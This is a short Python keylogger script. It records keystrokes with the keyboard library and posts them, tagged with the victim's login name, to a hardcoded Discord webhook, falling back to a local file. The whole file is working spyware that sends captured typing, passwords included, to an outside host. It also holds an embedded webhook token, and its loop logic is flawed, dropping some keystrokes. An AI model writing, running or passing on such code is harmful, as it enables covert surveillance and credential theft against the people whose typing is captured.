import keyboard
import os
from discord import SyncWebhook
from datetime import date
import time

print(f"Programme Lance le {date.today()}")
path = "output.txt"
url = "https://discord.com/api/webhooks/905780173968900116/FHrPXPRqhlEgqIjyjkVL-1faByw3_sMnyhhToq7kVksw8_a9_oz" \
      "-CsHQKiTP38wGupfW "
webhook = SyncWebhook.from_url(url)
out = ""
f = open(path, "a")

while True:
    while keyboard.read_key():
        out += keyboard.read_key()
    else:
        if url:
            webhook.send(f"{os.getlogin()} has typed: {out}")
        else:
            f.write(out)
            out = ""

    if keyboard.read_key() == "esc":
        f.close()
        exit()
